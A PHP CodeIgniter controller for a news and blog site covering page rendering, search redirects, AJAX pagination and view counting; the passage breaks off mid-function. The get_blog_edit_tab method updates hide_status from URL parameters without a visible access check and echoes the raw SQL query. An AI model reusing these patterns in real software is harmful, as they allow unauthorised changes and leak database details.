<?php

if (!defined('BASEPATH'))
    exit('No direct script access allowed');

class Home extends CI_Controller {

    function __construct() {
        parent::__construct();
        $this->load->database();
        $this->load->library('paypal');
        ini_set("memory_limit", "256M");

        $cache_time  =  $this->db->get_where('general_settings',array('type' => 'cache_time'))->row()->value;
        if(!$this->input->is_ajax_request()){
            $this->output->set_header('HTTP/1.0 200 OK');
            $this->output->set_header('HTTP/1.1 200 OK');
            $this->output->set_header('Last-Modified: '.gmdate('D, d M Y H:i:s', time()).' GMT');
            $this->output->set_header('Cache-Control: no-store, no-cache, must-revalidate');
            $this->output->set_header('Cache-Control: post-check=0, pre-check=0');
            $this->output->set_header('Pragma: no-cache');
            if($this->router->fetch_method() == 'index' ||
                $this->router->fetch_method() == 'category_news' ||
                    $this->router->fetch_method() == 'archive_news' ||
                        $this->router->fetch_method() == 'photo_gallery' ||
                            $this->router->fetch_method() == 'video_gallery' ||
                                $this->router->fetch_method() == 'reporters'){
                $this->output->cache($cache_time);
            }
        }
        $this->config->cache_query();
        setcookie('lang', $this->session->userdata('language'), time() + (86400), "/");
        $this->Crud_model->package_expiration_check();
    }

    public function index() {
        $page_data['asset_page'] = 'home';
        $page_data['page_name'] = 'home/home-1';
        $page_data['page_title'] = translate('home');
        $page_data['page_meta'] = $this->get_page_meta();
        $this->load->view('front/index', $page_data);
    }

    function news($para1 = '', $para2 = '', $para3 = '', $para4 = '', $para5 = '') {
        $page_data['news_category']     = $para1;
        $page_data['news_sub_category'] = $para2;
        if (isset($para3)) {
            $page_data['start_date'] = $para3;
        }
        if (isset($para4)) {
            $page_data['end_date'] = $para4;
        }
        if (isset($para5)) {
            $text = $this->session->flashdata('search_text');
            $page_data['header_search_text'] = $text;
        }
        $page_data['asset_page'] = 'news_list';
        $page_data['page_name'] = 'news_list';
        $page_data['page_title'] = translate('news');
        $this->load->view('front/index', $page_data);
    }

    function set_intro($para1 = '', $para2 = '') {
        $page_data['news_category'] = $para1;
        $page_data['news_sub_category'] = $para2;
        $this->load->view('front/news_list/intro', $page_data);
    }

    function load_date($para1 = '', $para2 = '') {
        $page_data['st_date'] = $para1;
        $page_data['en_date'] = $para2;
        $this->load->view('front/news_list/date_search', $page_data);
    }

    function load_log_info() {
        $this->load->view('front/header/log_info_buttons');
    }
    function load_log_info_1() {
        $this->load->view('front/header/log_info_buttons_1');
    }

    function top_search(){
        $text = $this->input->post('menu_search_bar');
        $this->session->set_flashdata('search_text',$text);
        redirect(base_url() . 'home/news/0/0/0/0/'.$text);
    }

    function widget_archive_search(){
        $category       = $this->input->post('category');
        $sub_category   = $this->input->post('sub_category');
        $text_search    = $this->input->post('text_search');
        $start_date     = $this->input->post('start_date');
        $end_date       = $this->input->post('end_date');
        $this->session->set_flashdata('archive_search_text',$text_search);
        if ($category == null) {
            $category = '0';
        }
        if ($sub_category == null) {
            $sub_category = '0';
        }
        if (strlen($start_date) == '') {
            $start_date = '0';
        }
        if (strlen($end_date) == '') {
            $end_date = '0';
        }
        redirect(base_url() . 'home/archive_news/' . $category . '/' . $sub_category . '/' . $start_date . '/' . $end_date . '/' . $text_search);
    }


    function widget_search(){
        $category       = $this->input->post('category');
        $sub_category   = $this->input->post('sub_category');
        $text_search    = $this->input->post('text_search');
        $start_date     = $this->input->post('start_date');
        $end_date       = $this->input->post('end_date');
        $this->session->set_flashdata('search_text',$text_search);
        if ($category == null) {
            $category = '0';
        }
        if ($sub_category == null) {
            $sub_category = '0';
        }
        if (strlen($start_date) == '') {
            $start_date = '0';
        }
        if ($end_date == '') {
            $end_date = '0';
        }
        redirect(base_url() . 'home/news/' . $category . '/' . $sub_category . '/' . $start_date . '/' . $end_date . '/' . $text_search);
    }


    function blog_category($para1 = '', $para2 = '', $para3 = '') {
        $page_data['blog_category'] = $para1;
        $page_data['blog_sub_category'] = $para2;
        $page_data['blog_date'] = $para3;
        $page_data['asset_page'] = 'category_blog';
        $page_data['page_name'] = 'category_blog';
        $page_data['page_title'] = translate('category_blog');
        $this->load->view('front/index', $page_data);
    }

    function ajax_blog_list($para1 = '', $para2 = '', $para3 = '') {
        $this->load->library('Ajax_pagination');

        // pagination
        if ($para2!='0') {
            $this->db->where('blog_category_id', $para2);
        }
        if ($para3!='0') {
            $this->db->where('blog_sub_category_id', $para3);
        }
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');
        $blog_date = $this->input->post('blog_date');
        if ($blog_date != '') {
            $blog_date_from = strtotime($blog_date . '00:00:00');
            $this->db->where('date>=', $blog_date_from);
            $blog_date_to = strtotime($blog_date . '23:59:59');
            $this->db->where('date<=', $blog_date_to);
        } else {
            if (!empty($this->input->post('date_from'))) {
                $date_from = $this->input->post('date_from');
                $date_from = strtotime($date_from . '00:00:00');

                $this->db->where('date>=', $date_from);
            }
            if (!empty($this->input->post('date_to'))) {
                $date_to = $this->input->post('date_to');
                $date_to = strtotime($date_to . '23:59:59');

                $this->db->where('date<=', $date_to);
            }
        }
        if (!empty($this->input->post('search_text'))) {
            $search_text = $this->input->post('search_text');

            $this->db->like('title', $search_text, 'both');
            $this->db->or_like('summary', $search_text, 'both');
            $this->db->or_like('tag', $search_text, 'both');
        }
        $config['total_rows'] = $this->db->count_all_results('blog');
        $config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 6;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_blog('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_blog('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_blog('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_blog('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_blog(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        if ($para2!='0') {
            $this->db->where('blog_category_id', $para2);
        }
        if ($para3!='0') {
            $this->db->where('blog_sub_category_id', $para3);
        }
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');

        if ($blog_date != '') {
            $blog_date_from = strtotime($blog_date . '00:00:00');
            $this->db->where('date>=', $blog_date_from);
            $blog_date_to = strtotime($blog_date . '23:59:59');
            $this->db->where('date<=', $blog_date_to);
        } else {
            if (!empty($this->input->post('date_from'))) {
                $date_from = $this->input->post('date_from');
                $date_from = strtotime($date_from . '00:00:00');

                $this->db->where('date>=', $date_from);
            }
            if (!empty($this->input->post('date_to'))) {
                $date_to = $this->input->post('date_to');
                $date_to = strtotime($date_to . '23:59:59');

                $this->db->where('date<=', $date_to);
            }
        }
        if (!empty($this->input->post('search_text'))) {
            $search_text = $this->input->post('search_text');

            $this->db->like('title', $search_text, 'both');
            $this->db->or_like('summary', $search_text, 'both');
            $this->db->or_like('tag', $search_text, 'both');
        }

        $page_data['blogs'] = $this->db->get('blog', $config['per_page'], $para1)->result_array();
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/category_blog/blog', $page_data);
    }

    function get_blog_edit_tab($para1 = '', $para2 = '', $para3 = '') {
        if ($para1 == 'blog_edit') {
            $this->load->view('front/user/profile/blog_list/ajax_blog_list');
        } elseif ($para1 == 'blog_image_edit') {
            $this->load->view('front/user/profile/blog_list/ajax_photo_list');
        } elseif ($para1 == 'blog_video_edit') {
            $this->load->view('front/user/profile/blog_list/ajax_video_list');
        } else if ($para1 == 'hide_status') {
            echo $para1.", ".$para2.", ",$para3;
            $id = $para2;
            // $publish_time = $this->db->get_where('blog',array('blog_id' => $id))->row()->publish_timestamp;
            if ($para3 == 'true') {
                $data['hide_status'] = 'true';
            } else {
                $data['hide_status'] = 'false';
            }
            $this->db->where('blog_id', $id);
            $this->db->update('blog', $data);
            echo '<br>'.$this->db->last_query();
            recache();
        } else if ($para1 == 'hide_status_photo') {
            echo $para1.", ".$para2.", ",$para3;
            $id = $para2;
            // $publish_time = $this->db->get_where('blog',array('blog_id' => $id))->row()->publish_timestamp;
            if ($para3 == 'true') {
                $data['hide_status'] = 'true';
            } else {
                $data['hide_status'] = 'false';
            }
            $this->db->where('blog_photo_id', $id);
            $this->db->update('blog_photo', $data);
            echo '<br>'.$this->db->last_query();
            recache();
        } else if ($para1 == 'hide_status_video') {
            echo $para1.", ".$para2.", ",$para3;
            $id = $para2;
            // $publish_time = $this->db->get_where('blog',array('blog_id' => $id))->row()->publish_timestamp;
            if ($para3 == 'true') {
                $data['hide_status'] = 'true';
            } else {
                $data['hide_status'] = 'false';
            }
            $this->db->where('blog_video_id', $id);
            $this->db->update('blog_video', $data);
            echo '<br>'.$this->db->last_query();
            recache();
        }
    }

    function blogger_description($user_id = '') {
        $page_data['blogger_id'] = $user_id;
        $page_data['user_info'] = $this->db->get_where('user', array('user_id' => $user_id))->result_array();
        $page_data['page_title'] = translate('blogger_description');
        $page_data['asset_page'] = 'profile';
        $page_data['page_name'] = 'blogger_description';
        $page_data['my_categories'] = $this->db->select('DISTINCT(blog_category_id)')->get_where('blog',array('blog_uploader_id' => $user_id))->result();
        $this->load->view('front/index', $page_data);
    }

    function ajax_blogger_profile_list($para1 = '', $para2 = '') {
        $this->load->library('Ajax_pagination');

        // pagination
        $this->db->where('blog_uploader_id', $para1);
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');
        $config['total_rows'] = $this->db->count_all_results('blog');
        //$config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 6;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para2;

        $function = "filter_blog_profile('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_blog_profile('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_blog_profile('" . ($para2 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_blog_profile('" . ($para2 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_blog_profile(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        $this->db->where('blog_uploader_id', $para1);
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');
        $page_data['blog_profile'] = $this->db->get('blog', $config['per_page'], $para2)->result_array();
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/blogger_description/ajax_list', $page_data);
    }

    function ajax_blogger_photo_list($para1 = '', $para2 = '') {
        $this->load->library('Ajax_pagination');

        // pagination
        $this->db->where('blog_photo_uploader_id', $para1);
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');
        $config['total_rows'] = $this->db->count_all_results('blog_photo');
        //$config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 9;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para2;

        $function = "filter_blog_photo('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_blog_photo('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_blog_photo('" . ($para2 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_blog_photo('" . ($para2 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_blog_photo(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        $this->db->where('blog_photo_uploader_id', $para1);
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');
        $page_data['blog_photo_profile'] = $this->db->get('blog_photo', $config['per_page'], $para2)->result_array();
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/blogger_description/ajax_photo_list', $page_data);
    }

    function ajax_blogger_video_list($para1 = '', $para2 = '') {
        $this->load->library('Ajax_pagination');

        // pagination
        $this->db->where('blog_video_uploader_id', $para1);
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');
        $config['total_rows'] = $this->db->count_all_results('blog_video');
        //$config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 9;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para2;

        $function = "filter_blog_video('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_blog_video('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_blog_video('" . ($para2 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_blog_video('" . ($para2 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_blog_video(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        $this->db->where('blog_video_uploader_id', $para1);
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');
        $page_data['blog_video_profile'] = $this->db->get('blog_video', $config['per_page'], $para2)->result_array();
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/blogger_description/ajax_video_list', $page_data);
    }


    function ajax_news_list($para1 = '') {
        $this->load->library('Ajax_pagination');

        $all_result = array();
        $text_result = array();
        $cat_result = array();
        $sub_result = array();
        $after_result = array();
        $before_result = array();
        $final_result = array();

        $category_id = $this->input->post('news_category');
        $sub_category_id = $this->input->post('news_sub_category');
        if ($this->input->post('search_text')) {
            $search_text = $this->input->post('search_text');
        }
        $order_by = $this->input->post('order_by');
        if ($this->input->post('start_date')) {
            $start_date = $this->input->post('start_date');
            $start_date = strtotime($start_date . '00:00:00');
        }
        if ($this->input->post('end_date')) {
            $end_date = $this->input->post('end_date');
            $end_date = strtotime($end_date . '23:59:59');
        }
        $this->db->order_by('news_id','desc');
        $this->db->where('status', 'published');
        $all_id = $this->db->get('news')->result_array();

        foreach ($all_id as $row) {
            $all_result[] = $row['news_id'];
        }
        if ($category_id != '0') {
            $this->db->where('news_category_id', $category_id);
            $this->db->where('status', 'published');
            $cat_search = $this->db->get('news')->result_array();
            foreach ($cat_search as $row) {
                $cat_result[] = $row['news_id'];
            }
        } else {
            $cat_result = $all_result;
        }

        if ($sub_category_id != '0') {
            $this->db->where('news_sub_category_id', $sub_category_id);
            $this->db->where('status', 'published');
            $sub_search = $this->db->get('news')->result_array();
            foreach ($sub_search as $row) {
                $sub_result[] = $row['news_id'];
            }
        } else {
            $sub_result = $all_result;
        }

        if (isset($start_date)) {
            if ($start_date !== '') {
                $this->db->where('date>=', $start_date);
                $this->db->where('status', 'published');
                $after_search = $this->db->get('news')->result_array();
                foreach ($after_search as $row) {
                    $after_result[] = $row['news_id'];
                }
            }
        } else {
            $after_result = $all_result;
        }

        if (isset($end_date)) {
            if ($end_date !== '') {
                $this->db->where('date<=', $end_date);
                $this->db->where('status', 'published');
                $before_search = $this->db->get('news')->result_array();
                foreach ($before_search as $row) {
                    $before_result[] = $row['news_id'];
                }
            }
        } else {
            $before_result = $all_result;
        }

        if (isset($search_text)) {
            if ($search_text !== '') {
                $this->db->like('title', $search_text, 'both');
                $this->db->or_like('summary', $search_text, 'both');
                $this->db->or_like('tag', $search_text, 'both');
                $this->db->where('status', 'published');
                $text_search = $this->db->get('news')->result_array();
                foreach ($text_search as $row) {
                    $text_result[] = $row['news_id'];
                }
            }
        } else {
            $text_result = $all_result;
        }

        $final_result = array_intersect($text_result, $cat_result, $sub_result, $after_result, $before_result);
        if (count($final_result) !== 0) {
            if ($order_by !== 'none') {
                if ($order_by == 'newest') {
                    $this->db->order_by('publish_timestamp', 'desc');
                } elseif ($order_by == 'oldest') {
                    $this->db->order_by('publish_timestamp', 'asc');
                } elseif ($order_by == 'most_viewed') {
                    $this->db->order_by('view_count', 'desc');
                }
            } else {
                $this->db->order_by('news_id', 'desc');
            }
            $this->db->where_in('news_id', $final_result);
            $config['total_rows'] = $this->db->count_all_results('news');
        } else {
            $config['total_rows'] = 0;
        }

        // pagination
        $config['base_url'] = base_url() . 'home/ajax_news_list/';
        $config['per_page'] = 7;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_news('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_news('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_news(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        if (count($final_result) !== 0) {
            if ($order_by !== 'none') {
                if ($order_by == 'newest') {
                    $this->db->order_by('news_id', 'desc');
                } elseif ($order_by == 'oldest') {
                    $this->db->order_by('news_id', 'asc');
                } elseif ($order_by == 'most_viewed') {
                    $this->db->order_by('view_count', 'desc');
                }
            } else {
                $this->db->order_by('news_id', 'desc');
            }
            $this->db->where_in('news_id', $final_result);
            $page_data['news'] = $this->db->get('news', $config['per_page'], $para1)->result_array();
        } else {
            $page_data['news'] = array();
        }

        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/news_list/ajax_list', $page_data);
    }


function archive_news($para1 = '', $para2 = '', $para3 = '', $para4 = '', $para5 = '') {
        $page_data['news_category'] = $para1;
        $page_data['news_sub_category'] = $para2;
        if (isset($para3)) {
            $page_data['start_date'] = $para3;
        }
        if (isset($para4)) {
            $page_data['end_date'] = $para4;
        }
        if (isset($para5)) {
            $text = $this->session->flashdata('archive_search_text');
            $page_data['header_search_text'] = $text;
        }

        $page_data['asset_page'] = 'archive_news';
        $page_data['page_name'] = 'archive_news';
        $page_data['page_title'] = translate('archive_news');
        $this->load->view('front/index', $page_data);
    }

    function archive_load_date($para1 = '', $para2 = '') {
        $page_data['st_date'] = $para1;
        $page_data['en_date'] = $para2;
        $this->load->view('front/archive_news/date_search', $page_data);
    }

function archive_ajax_news_list($para1 = '') {
        $this->load->library('Ajax_pagination');

        $all_result = array();
        $text_result = array();
        $cat_result = array();
        $sub_result = array();
        $after_result = array();
        $before_result = array();
        $final_result = array();

        $this->db->where('status', 'published');
        $category_id = $this->input->post('news_category');

        $sub_category_id = $this->input->post('news_sub_category');
        if ($this->input->post('search_text')) {
            $search_text = $this->input->post('search_text');
        }
        $order_by = $this->input->post('order_by');
        if ($this->input->post('start_date')) {
            $start_date = $this->input->post('start_date');
            $start_date = strtotime($start_date . '00:00:00');
        }
        if ($this->input->post('end_date')) {
            $end_date = $this->input->post('end_date');
            $end_date = strtotime($end_date . '23:59:59');
        }

        $all_id = $this->db->get('news_archive')->result_array();
        foreach ($all_id as $row) {
            $all_result[] = $row['news_archive_id'];
        }
        if ($category_id != '0') {
            $this->db->where('news_category_id', $category_id);
            $this->db->where('status', 'published');
            $cat_search = $this->db->get('news_archive')->result_array();
            foreach ($cat_search as $row) {
                $cat_result[] = $row['news_archive_id'];
            }
        } else {
            $cat_result = $all_result;
        }

        if ($sub_category_id != '0') {
            $this->db->where('news_sub_category_id', $sub_category_id);
            $this->db->where('status', 'published');
            $sub_search = $this->db->get('news_archive')->result_array();
            foreach ($sub_search as $row) {
                $sub_result[] = $row['news_archive_id'];
            }
        } else {
            $sub_result = $all_result;
        }

        if (isset($start_date)) {
            if ($start_date !== '') {
                $this->db->where('date>=', $start_date);
                $this->db->where('status', 'published');
                $after_search = $this->db->get('news_archive')->result_array();
                foreach ($after_search as $row) {
                    $after_result[] = $row['news_archive_id'];
                }
            }
        } else {
            $after_result = $all_result;
        }

        if (isset($end_date)) {
            if ($end_date !== '') {
                $this->db->where('date<=', $end_date);
                $this->db->where('status', 'published');
                $before_search = $this->db->get('news_archive')->result_array();
                foreach ($before_search as $row) {
                    $before_result[] = $row['news_archive_id'];
                }
            }
        } else {
            $before_result = $all_result;
        }

        if (isset($search_text)) {
            if ($search_text !== '') {
                $this->db->like('title', $search_text, 'both');
                $this->db->or_like('summary', $search_text, 'both');
                $this->db->or_like('tag', $search_text, 'both');
                $this->db->where('status', 'published');
                $text_search = $this->db->get('news_archive')->result_array();
                foreach ($text_search as $row) {
                    $text_result[] = $row['news_archive_id'];
                }
            }
        } else {
            $text_result = $all_result;
        }

        $final_result = array_intersect($text_result, $cat_result, $sub_result, $after_result, $before_result);
        if (count($final_result) !== 0) {
            if ($order_by !== 'none') {
                if ($order_by == 'newest') {
                    $this->db->order_by('news_archive_id', 'desc');
                } elseif ($order_by == 'oldest') {
                    $this->db->order_by('news_archive_id', 'asc');
                } elseif ($order_by == 'most_viewed') {
                    $this->db->order_by('view_count', 'desc');
                }
            } else {
                $this->db->order_by('news_archive_id', 'desc');
            }
            $this->db->where_in('news_archive_id', $final_result);
            $config['total_rows'] = $this->db->count_all_results('news_archive');
        } else {
            $config['total_rows'] = 0;
        }

        // pagination
        $config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 6;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_news('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_news('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_news('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_news(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        if (count($final_result) !== 0) {
            if ($order_by !== 'none') {
                if ($order_by == 'newest') {
                    $this->db->order_by('news_archive_id', 'desc');
                } elseif ($order_by == 'oldest') {
                    $this->db->order_by('news_archive_id', 'asc');
                } elseif ($order_by == 'most_viewed') {
                    $this->db->order_by('view_count', 'desc');
                }
            } else {
                $this->db->order_by('news_archive_id', 'desc');
            }
            $this->db->where_in('news_archive_id', $final_result);
            $page_data['news'] = $this->db->get('news_archive', $config['per_page'], $para1)->result_array();
        } else {
            $page_data['news'] = array();
        }
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/archive_news/ajax_list', $page_data);
    }

    function news_description($para1 = '') {
        $page_data['news_id'] = $para1;
        $page_data['news_mood'] = 'news';
        $news_data = $this->db->get_where('news', array('news_id' => $para1, 'status' => 'published'));
        $page_data['news_description'] = $news_data->result_array();
        if (count($page_data['news_description']) == 1) {
            $page_data['news_description'] = $news_data->result_array();
            $this->db->where('news_id', $para1);
            $this->db->update('news', array(
                'view_count' => $news_data->row()->view_count + 1
            ));
            $page_data['asset_page'] = 'news_description';
            $page_data['page_name'] = 'news_description';
            $page_data['page_title'] = $news_data->row()->title;
            $this->load->view('front/index', $page_data);
        } else {
            redirect(base_url() . 'home');
        }
    }

    function news_description_archive($para1 = '') {
        $page_data['news_id'] = $para1;
        $page_data['news_mood'] = 'news_archive';
        $news_data = $this->db->get_where('news_archive', array('news_archive_id' => $para1));
        $page_data['news_description'] = $news_data->result_array();
        if (count($page_data['news_description']) == 1) {
            $this->db->where('news_archive_id', $para1);
            $this->db->update('news_archive', array(
                'view_count' => $news_data->row()->view_count + 1
            ));
            $page_data['asset_page'] = 'news_description';
            $page_data['page_name'] = 'news_description';
            $page_data['page_title'] = $news_data->row()->title;
            $this->load->view('front/index', $page_data);
        } else {
            redirect(base_url() . 'home');
        }
    }

    function photo_description($para1 = '') {
        $page_data['photo_id'] = $para1;
        $photo_data = $this->db->get_where('photo', array('photo_id' => $para1));
        $page_data['photo_description'] = $photo_data->result_array();

        $page_data['asset_page'] = 'photo_description';
        $page_data['page_name'] = 'photo_description';
        $page_data['page_title'] = $photo_data->row()->title;
        $this->load->view('front/index', $page_data);
    }

    function video_description($para1 = '') {
        $page_data['video_id'] = $para1;
        $video_data = $this->db->get_where('video', array('video_id' => $para1, 'status' => 'published'));
        $page_data['video_description'] = $video_data->result_array();

        $page_data['asset_page'] = 'video_description';
        $page_data['page_name'] = 'video_description';
        $page_data['page_title'] = $video_data->row()->title;
        $this->load->view('front/index', $page_data);
    }

    function reporter_description($para1 = '') {
        $this->db->limit(5);
        $this->db->order_by('news_id', 'desc');
        $this->db->where('news_reporter_id', $para1);
        $page_data['reporter_news'] = $this->db->get('news')->result_array();

        $reporter_data = $this->db->get_where('news_reporter', array('news_reporter_id' => $para1));
        $page_data['reporter_description'] = $reporter_data->result_array();

        $page_data['asset_page'] = 'reporter_description';
        $page_data['page_name'] = 'reporter_description';
        $page_data['page_title'] = $reporter_data->row()->name;
        $this->load->view('front/index', $page_data);
    }

    function photo_gallery() {
        $page_data['asset_page'] = 'photo_gallery';
        $page_data['page_name'] = 'photo_gallery';
        $page_data['page_title'] = translate('photo_gallery');
        $this->load->view('front/index', $page_data);
    }

    function get_photo_list() {
        $this->load->view('front/photo_gallery/photo_list');
    }

    function ajax_photo_list($para1 = '') {
        $this->load->library('Ajax_pagination');

        // pagination
        $this->db->where('status', 'published');
        $config['total_rows'] = $this->db->count_all_results('photo');
        $config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 12;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_news('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
